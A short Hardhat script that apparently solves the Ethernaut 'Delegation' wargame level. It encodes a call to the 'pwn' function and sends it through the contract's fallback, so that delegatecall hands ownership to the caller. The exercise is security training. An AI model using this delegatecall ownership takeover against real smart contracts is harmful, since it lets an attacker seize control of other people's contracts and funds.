import { ethers } from "hardhat";

const ETHERNAUT_ADDRESS = "";

async function main() {
  // Get Address on the private key
  const deployers = await ethers.getSigners();
  console.log("Deployer address is", deployers[0].address);

  // Get the Delegate contract
  const Delegate = await ethers.getContractFactory("Delegate");

  // Get the Ethernaut Delegation contract
  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.attach(ETHERNAUT_ADDRESS);
  console.log("Attach Delegation contract at", delegation.address);

  // Get the encode function data
  const encodeFx = Delegate.interface.encodeFunctionData("pwn", []);
  const data = ethers.utils.hexlify(encodeFx);

  // Change the owner
  const fallbackTx = await delegation.fallback({ data, gasLimit: 1000000 });
  await fallbackTx.wait();
  console.log("Fallback transaction mined at", fallbackTx.hash);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
